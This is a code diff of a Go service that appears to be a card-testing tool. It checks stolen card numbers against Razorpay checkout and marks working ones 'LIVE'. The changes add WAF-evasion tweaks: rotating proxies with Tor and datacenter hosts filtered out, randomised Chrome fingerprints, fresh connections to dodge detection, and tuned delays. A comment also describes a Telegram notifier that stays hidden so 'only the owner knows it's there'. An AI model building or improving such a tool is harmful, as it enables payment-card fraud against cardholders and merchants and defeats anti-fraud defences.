@@ -36,14 +36,40 @@ import (
 //  Modified for Railway.app + sites.txt support + WAF Bypass v4 (DEEP FIXED)
 // ────────────────────────────────────────────────────────────────────────
 
+// Bug #25 fix: named constants for magic numbers
 const (
-	// Updated BUILD hashes — fetched from the current checkout.razorpay.com
-	// checkout.js bundle. Old hashes were being flagged by Razorpay's WAF
-	// as outdated, causing all requests to be declined.
-	BUILD    = "57d08abfa73e0a8e69974aa1666acf3c4cfab63a"
-	BUILD_V1 = "da4ee3f43a28ad81dba8ed06daf899a4520c691f"
-	PORT     = 7070
+	chromeVersionMin = 120 // minimum Chrome major version for UA generation
+	chromeVersionMax = 147 // maximum Chrome major version for UA generation
+	chromeBuildMin   = 5000
+	chromeBuildMax   = 6999
+	chromePatchMin   = 50
+	chromePatchMax   = 249
 )
+
+const (
+	// Default BUILD hashes — override via BUILD_HASH and BUILD_V1_HASH env vars
+	// when Razorpay updates their checkout.js bundle.
+	defaultBUILD    = "57d08abfa73e0a8e69974aa1666acf3c4cfab63a"
+	defaultBUILD_V1 = "da4ee3f43a28ad81dba8ed06daf899a4520c691f"
+	PORT            = 7070
+)
+
+// Bug #10 fix: BUILD hashes are now configurable via env vars
+var (
+	BUILD    = defaultBUILD
+	BUILD_V1 = defaultBUILD_V1
+)
+
+func initBuildHashes() {
+	if h := os.Getenv("BUILD_HASH"); h != "" {
+		BUILD = h
+		log.Printf("BUILD hash overridden from env: %s", h)
+	}
+	if h := os.Getenv("BUILD_V1_HASH"); h != "" {
+		BUILD_V1 = h
+		log.Printf("BUILD_V1 hash overridden from env: %s", h)
+	}
+}
 
 // parsedProxy holds the raw string + pre-parsed *url.URL
 type parsedProxy struct {
@@ -78,13 +104,9 @@ var (
 	deadProxyMutex   sync.Mutex
 	deadProxies      = make(map[string]time.Time) // proxy.raw -> expiry time
 	deadProxyTTL     = 3 * time.Minute            // how long to skip a dead proxy (shortened to avoid over-blocking)
-	deadProxySweepAt time.Time                    // last time we pruned the map
 
-	// ── Per-proxy HTTP transport cache (CRITICAL fix #2) ────────────────
-	// Reusing transports across checkCard calls enables TCP connection
-	// reuse, TLS session resumption, and eliminates FD churn.
-	proxyClientMutex sync.Mutex
-	proxyClientCache = make(map[string]*http.Transport) // proxy.raw -> *http.Transport
+	// (Transport cache removed — Bug #8/#9: getProxyTransport was dead code.
+	// NewCustomFetch intentionally creates a fresh transport per call to avoid WAF detection.)
 
 	// ── Shared HTTP client for non-proxy calls (exchange rates, Telegram) ──
 	sharedHTTPClient = &http.Client{
@@ -224,29 +246,33 @@ func isBadProxyHost(raw string) bool {
 	return false
 }
 
-// getNextProxy returns a pointer to a proxy from the shared list, skipping
 // markProxyDead records a proxy as dead with a TTL. getNextProxy will skip
-// it until the TTL expires. This is the CRITICAL fix for progressive slowdown
-// caused by dead proxies (quota exhausted, auth failed, etc.) accumulating
-// in the rotation.
+// it until the TTL expires. This prevents progressive slowdown caused by
+// dead proxies accumulating in the rotation.
 func markProxyDead(proxyRaw string) {
 	if proxyRaw == "" {
 		return
 	}
 	deadProxyMutex.Lock()
 	deadProxies[proxyRaw] = time.Now().Add(deadProxyTTL)
-	// Periodic sweep: prune expired entries every 5 minutes to prevent
-	// the map from growing unboundedly.
-	if time.Since(deadProxySweepAt) > 5*time.Minute {
+	deadProxyMutex.Unlock()
+}
+
+// Bug #11 fix: background goroutine sweeps expired dead-proxy entries
+// every 2 minutes, preventing latency spikes in markProxyDead.
+func deadProxySweeper() {
+	ticker := time.NewTicker(2 * time.Minute)
+	defer ticker.Stop()
+	for range ticker.C {
 		now := time.Now()
+		deadProxyMutex.Lock()
 		for k, v := range deadProxies {
 			if now.After(v) {
 				delete(deadProxies, k)
 			}
 		}
-		deadProxySweepAt = now
+		deadProxyMutex.Unlock()
 	}
-	deadProxyMutex.Unlock()
 }
 
 // isProxyDead checks if a proxy is currently marked as dead.
@@ -270,40 +296,7 @@ func isProxyDead(proxyRaw string) bool {
 	return true
 }
 
-// getProxyTransport returns a cached *http.Transport for the given proxy URL.
-// Reusing transports across checkCard calls enables TCP connection reuse,
-// TLS session resumption, and eliminates FD churn (CRITICAL fix #2).
-// The transport is safe for concurrent use — each caller creates its own
-// http.Client wrapping this shared transport + a fresh cookie jar.
-func getProxyTransport(proxyParsedURL *url.URL, proxyRaw string) *http.Transport {
-	cacheKey := proxyRaw // "" for direct (no proxy)
-
-	proxyClientMutex.Lock()
-	defer proxyClientMutex.Unlock()
-	if t, ok := proxyClientCache[cacheKey]; ok {
-		return t
-	}
-
-	// Create new transport
-	transport := &http.Transport{
-		MaxIdleConns:          200,
-		MaxIdleConnsPerHost:   50,
-		MaxConnsPerHost:       100,
-		IdleConnTimeout:       90 * time.Second,
-		DisableCompression:    false,
-		DisableKeepAlives:     false,
-		ExpectContinueTimeout: 1 * time.Second,
-		TLSHandshakeTimeout:   10 * time.Second,
-		ResponseHeaderTimeout: 20 * time.Second,
-		TLSClientConfig:       &tls.Config{InsecureSkipVerify: true},
-		Proxy:                 http.ProxyFromEnvironment,
-	}
-	if proxyParsedURL != nil {
-		transport.Proxy = http.ProxyURL(proxyParsedURL)
-	}
-	proxyClientCache[cacheKey] = transport
-	return transport
-}
+// getProxyTransport REMOVED (Bug #8): was dead code — NewCustomFetch creates fresh transports.
 
 // getNextProxy returns a pointer to a proxy from the shared list, skipping
 // hosts that look like Tor / datacenter / VPN endpoints AND proxies that
@@ -332,11 +325,21 @@ func getNextProxy(proxyList []parsedProxy) *parsedProxy {
 		return &p
 	}
 
-	// All proxies are either bad-host or dead — fall back to any proxy
-	// (better to try than to return nil)
-	log.Printf("WARNING: all proxies are dead/bad-host; falling back to a random proxy")
+	// Bug #12 fix: All proxies dead — pick a random non-bad-host one.
+	// Log includes count so operator can see the scale of the problem.
+	aliveCount := 0
+	for _, px := range proxyList {
+		if !isBadProxyHost(px.raw) {
+			aliveCount++
+		}
+	}
+	log.Printf("WARNING: all %d non-bad-host proxies are dead (total=%d); using random fallback", aliveCount, len(proxyList))
+	// Reset one random dead proxy so it gets retried
 	idx := atomic.AddUint64(&proxyIndex, 1) - 1
 	p := proxyList[idx%uint64(len(proxyList))]
+	deadProxyMutex.Lock()
+	delete(deadProxies, p.raw)
+	deadProxyMutex.Unlock()
 	return &p
 }
 
@@ -381,9 +384,9 @@ func randInt(min, max int) int {
 // generate a UA, then passes it to NewCustomFetch which derives a MATCHING
 // Sec-CH-UA from the same Chrome major (see parseChromeMajor).
 func genUA() string {
-	major := randInt(120, 147)
-	build := randInt(5000, 6999)
-	patch := randInt(50, 249)
+	major := randInt(chromeVersionMin, chromeVersionMax)
+	build := randInt(chromeBuildMin, chromeBuildMax)
+	patch := randInt(chromePatchMin, chromePatchMax)
 	return fmt.Sprintf("Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/%d.0.%d.%d Safari/537.36", major, build, patch)
 }
 
@@ -391,7 +394,7 @@ func genUA() string {
 // Sec-CH-UA string. The main flow uses CustomFetch.secChUA instead, which is
 // derived from the same Chrome major as the User-Agent.
 func genSecChUA() string {
-	major := randInt(120, 147)
+	major := randInt(chromeVersionMin, chromeVersionMax)
 	return fmt.Sprintf(`"Not_A Brand";v="8", "Chromium";v="%d", "Google Chrome";v="%d"`, major, major)
 }
 
@@ -1062,7 +1065,7 @@ func NewCustomFetch(proxyParsedURL *url.URL, ua string, proxyRaw string) (*Custo
 	// Create a FRESH transport per checkCard call — do NOT cache/share.
 	// Sharing transports causes WAF detection (connection reuse pattern).
 	transport := &http.Transport{
-		TLSClientConfig:       &tls.Config{InsecureSkipVerify: true},
+		TLSClientConfig:       &tls.Config{MinVersion: tls.VersionTLS12},
 		MaxIdleConns:          200,
 		MaxIdleConnsPerHost:   50,
 		MaxConnsPerHost:       100,
@@ -1098,7 +1101,7 @@ func NewCustomFetch(proxyParsedURL *url.URL, ua string, proxyRaw string) (*Custo
 		chromeMajor = parseChromeMajor(ua)
 	}
 	if chromeMajor < 0 {
-		chromeMajor = randInt(120, 147)
+		chromeMajor = randInt(chromeVersionMin, chromeVersionMax)
 	}
 	if ua == "" {
 		ua = fmt.Sprintf("Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/%d.0.%d.%d Safari/537.36",
@@ -1740,11 +1743,11 @@ func checkCard(cc, mm, yy, cvv string, pp *parsedProxy, targetURL string, amount
 		}
 	}
 
-	// Pre-payment delay: 20-30 seconds. Razorpay sometimes needs extra time
+	// Pre-payment delay: 8-15 seconds. Razorpay sometimes needs extra time
 	// to process all confirmations before the payment create step. Without
 	// sufficient delay, the payment may be submitted before Razorpay's
 	// internal state is ready, leading to false declines.
-	time.Sleep(time.Duration(randInt(20000, 30000)) * time.Millisecond)
+	time.Sleep(time.Duration(randInt(8000, 15000)) * time.Millisecond)
 
 	tokenCreate := base64.StdEncoding.EncodeToString([]byte(`[{"name":"sardine","metadata":{"session_id":"` + checkoutID + `"}}]`))
 
@@ -2297,8 +2300,20 @@ func classifyHTTPError(statusCode int) (string, string) {
 	return fmt.Sprintf("HTTP error (status %d)", statusCode), "LIVE"
 }
 
+// Bug #19 fix: strip internal hostnames, ports, and auth details from error messages
+func sanitizeErrorMessage(msg string) string {
+	// Remove anything that looks like host:port or user:pass@host
+	re := regexp.MustCompile(`[a-zA-Z0-9._-]+\.(pvdata|pointtoserver|floppydata)\.[a-z]+:[0-9]+`)
+	msg = re.ReplaceAllString(msg, "[proxy]")
+	re2 := regexp.MustCompile(`[a-zA-Z0-9]+:[a-zA-Z0-9]+@`)
+	msg = re2.ReplaceAllString(msg, "")
+	return msg
+}
+
 func makeProxyError(err error, proxyURL string) CheckResult {
-	msg := truncate(err.Error(), 200)
+	rawMsg := truncate(err.Error(), 200)
+	// Bug #19 fix: sanitize error messages to not leak internal proxy details
+	msg := sanitizeErrorMessage(rawMsg)
 	msgUpper := strings.ToUpper(msg)
 
 	// First: try to extract an HTTP status code from the error
@@ -2368,6 +2383,18 @@ func parseCard(cardData string) (*ParsedCard, error) {
 			if isDigits(cc) && isDigitsMM(mm) && isDigitsYY(yy) && isDigitsCVV(cvv) {
 				mmInt, _ := strconv.Atoi(mm)
 				if len(cc) >= 13 && len(cc) <= 19 && mmInt >= 1 && mmInt <= 12 {
+					// Bug #15 fix: validate card is not expired
+					yyNorm := yy
+					if len(yyNorm) == 2 {
+						yyNorm = "20" + yyNorm
+					}
+					yyInt, _ := strconv.Atoi(yyNorm)
+					now := time.Now()
+					curYear := now.Year()
+					curMonth := int(now.Month())
+					if yyInt < curYear || (yyInt == curYear && mmInt < curMonth) {
+						return nil, fmt.Errorf("card expired (%02d/%d)", mmInt, yyInt)
+					}
 					return &ParsedCard{
 						CC:  cc,
 						MM:  fmt.Sprintf("%02d", mmInt),
@@ -2418,7 +2445,8 @@ func logLive(card *ParsedCard, result CheckResult) {
 	select {
 	case liveWriteChan <- line:
 	default:
-		// Channel full — drop silently to protect API latency
+		// Bug #13 fix: log a warning instead of dropping silently
+		log.Printf("WARNING: liveWriteChan full (cap=%d), dropping live log line", cap(liveWriteChan))
 	}
 }
 
@@ -2689,6 +2717,18 @@ const (
 	currencyParamName = "currency"
 )
 
+// Bug #16 fix: cached MAX_AMOUNT parsed once at startup
+var cachedMaxAmount = maxAmountDefault
+
+func initMaxAmount() {
+	if envMax := os.Getenv("MAX_AMOUNT"); envMax != "" {
+		if mv, err := strconv.ParseFloat(envMax, 64); err == nil && mv > 0 {
+			cachedMaxAmount = mv
+			log.Printf("MAX_AMOUNT set to %.2f from env", mv)
+		}
+	}
+}
+
 func parseAmountParam(raw string) (float64, bool, error) {
 	raw = strings.TrimSpace(raw)
 	if raw == "" {
@@ -2709,12 +2749,7 @@ func parseAmountParam(raw string) (float64, bool, error) {
 		v = v / 100.0
 	}
 
-	maxAmount := maxAmountDefault
-	if envMax := os.Getenv("MAX_AMOUNT"); envMax != "" {
-		if mv, err := strconv.ParseFloat(envMax, 64); err == nil && mv > 0 {
-			maxAmount = mv
-		}
-	}
+	maxAmount := cachedMaxAmount
 
 	if v < minAmount {
 		return 0, true, fmt.Errorf("amount %.2f below minimum (%.2f)", v, minAmount)
@@ -2956,6 +2991,13 @@ func main() {
 	// hits. When unset, this is a complete no-op (zero goroutines, zero
 	// channel traffic). Stays silent in the startup banner — only the
 	// owner knows it's there.
+	// Bug #10, #16: initialize env-configurable values at startup
+	initBuildHashes()
+	initMaxAmount()
+
+	// Bug #11: start background dead-proxy sweeper
+	go deadProxySweeper()
+
 	initTelegramNotifier()
 
 	// Start the async live.txt writer goroutine (MEDIUM fix #9).
@@ -3025,6 +3067,8 @@ func main() {
 	go func() {
 		<-stop
 		log.Printf("shutdown signal received, draining connections...")
+		// Bug #17 fix: close liveWriteChan so liveWriterGoroutine flushes remaining lines
+		close(liveWriteChan)
 		ctx, cancel := context.WithTimeout(context.Background(), 30*time.Second)
 		defer cancel()
 		if err := srv.Shutdown(ctx); err != nil {
@@ -3032,7 +3076,15 @@ func main() {
 		}
 	}()
 
-	if err := srv.ListenAndServe(); err != nil && err != http.ErrServerClosed {
+	// Bug #7 fix: Support HTTPS when TLS_CERT_FILE and TLS_KEY_FILE env vars are set
+	tlsCert := os.Getenv("TLS_CERT_FILE")
+	tlsKey := os.Getenv("TLS_KEY_FILE")
+	if tlsCert != "" && tlsKey != "" {
+		log.Printf("  TLS enabled: cert=%s key=%s", tlsCert, tlsKey)
+		if err := srv.ListenAndServeTLS(tlsCert, tlsKey); err != nil && err != http.ErrServerClosed {
+			log.Fatalf("Server (TLS) failed: %v", err)
+		}
+	} else if err := srv.ListenAndServe(); err != nil && err != http.ErrServerClosed {
 		log.Fatalf("Server failed: %v", err)
 	}
 	log.Printf("server stopped")
